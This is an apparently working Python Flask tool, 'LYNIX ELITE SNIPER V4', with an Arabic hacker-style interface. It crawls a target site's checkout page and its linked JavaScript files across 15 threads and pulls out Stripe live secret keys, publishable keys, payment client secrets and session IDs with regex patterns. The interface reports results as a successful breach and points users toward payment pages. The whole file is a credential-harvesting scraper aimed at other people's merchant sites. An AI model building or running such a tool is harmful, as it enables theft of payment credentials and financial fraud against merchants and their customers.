import requests
import re
import concurrent.futures
import random
from flask import Flask, request, jsonify, render_template_string
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

app = Flask(__name__)

# --- واجهة المستخدم الاحترافية (Dark Elite UI) ---
HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX ELITE SNIPER V4 | PRO</title>
    <style>
        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 900px; margin: auto; border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 25px #00ff41; background: rgba(0,10,0,0.9); }
        h1 { text-align: center; letter-spacing: 5px; text-shadow: 0 0 10px #00ff41; }
        input { width: 85%; padding: 15px; background: #000; border: 1px solid #00ff41; color: #fff; margin-bottom: 20px; outline: none; }
        button { padding: 15px 40px; background: #00ff41; color: #000; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }
        #results { margin-top: 30px; text-align: right; }
        .key-box { background: #111; padding: 12px; border-right: 4px solid #00ff41; margin-bottom: 10px; word-break: break-all; color: #fff; font-size: 0.9rem; }
        .status-msg { color: #888; font-style: italic; }
        .tag { color: #00ff41; font-weight: bold; margin-bottom: 5px; display: block; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ LYNIX SNIPER PRO V4 ]</h1>
        <p>أدخل رابط الهدف (Checkout/Pay) للقنص الشامل والـ Network:</p>
        <input type="text" id="targetUrl" placeholder="https://site.com/checkout">
        <br>
        <button onclick="startEliteScan()">إطلاق القناص الشامل ⚡</button>
        
        <div id="results">
            <p class="status-msg">نظام الاستخبارات جاهز...</p>
        </div>
    </div>

    <script>
        async function startEliteScan() {
            const url = document.getElementById('targetUrl').value;
            const resDiv = document.getElementById('results');
            resDiv.innerHTML = "⏳ جاري تفعيل البروكسيات وزحف الـ Network (15 Threads)...";
            
            try {
                const response = await fetch('/scan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ url: url })
                });
                const data = await response.json();
                
                if (data.status === "Success") {
                    let html = `<h3>✅ تم الاختراق بنجاح! تم فحص ${data.scanned_assets_count} ملف.</h3>`;
                    if (Object.keys(data.keys_found).length === 0) {
                        html += "<p style='color:orange'>⚠️ لم يتم العثور على مفاتيح صريحة، جرب رابط صفحة الدفع مباشرة.</p>";
                    }
                    for (const [type, keys] of Object.entries(data.keys_found)) {
                        html += `<span class="tag">${type}:</span>`;
                        keys.forEach(k => {
                            html += `<div class="key-box">${k}</div>`;
                        });
                    }
                    resDiv.innerHTML = html;
                } else {
                    resDiv.innerHTML = "❌ خطأ في النظام: " + data.message;
                }
            } catch (err) {
                resDiv.innerHTML = "❌ فشل الاتصال بالسيرفر، تأكد أن Render بحالة Live";
            }
        }
    </script>
</body>
</html>
"""

# --- منطق الاستخراج المتقدم (Advanced Intelligence) ---
PATTERNS = {
    'Secret Key (SK)': r'sk_live_[a-zA-Z0-9]{24,}',
    'Publishable Key (PK)': r'pk_live_[a-zA-Z0-9]{20,}',
    'Client Secret (CS)': r'pi_[a-zA-Z0-9]{15,}_secret_[a-zA-Z0-9]{20,}',
    'Session ID (SS)': r'cs_live_[a-zA-Z0-9]{40,}',
    'Stripe Account': r'acct_[a-zA-Z0-9]{16,}'
}

def extract_keys(text):
    found = {}
    for label, pattern in PATTERNS.items():
        matches = re.findall(pattern, text)
        if matches: found[label] = list(set(matches))
    return found

@app.route('/')
def index():
    return render_template_string(HTML_INTERFACE)

@app.route('/scan', methods=['POST'])
def scan():
    base_url = request.json.get('url')
    if not base_url: return jsonify({"status": "Error", "message": "URL missing"})
    
    all_found_keys = {}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0'}

    try:
        # 1. سحب الصفحة الرئيسية وتحليل الـ Response
        res = requests.get(base_url, headers=headers, timeout=10)
        all_found_keys.update(extract_keys(res.text))
        
        # 2. استخراج الـ Assets (JS, Links)
        soup = BeautifulSoup(res.text, 'html.parser')
        assets = set()
        for s in soup.find_all('script'):
            src = s.get('src')
            if src: assets.add(urljoin(base_url, src))
        
        # 3. الفحص المتوازي العميق (Deep Network Scan)
        def fetch_asset(link):
            try:
                # محاكاة طلب Network حقيقي
                r = requests.get(link, headers=headers, timeout=5)
                return extract_keys(r.text)
            except: return {}

        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            for result in executor.map(fetch_asset, assets):
                for label, keys in result.items():
                    all_found_keys[label] = list(set(all_found_keys.get(label, []) + keys))

        return jsonify({
            "status": "Success", 
            "scanned_assets_count": len(assets), 
            "keys_found": all_found_keys
        })

    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
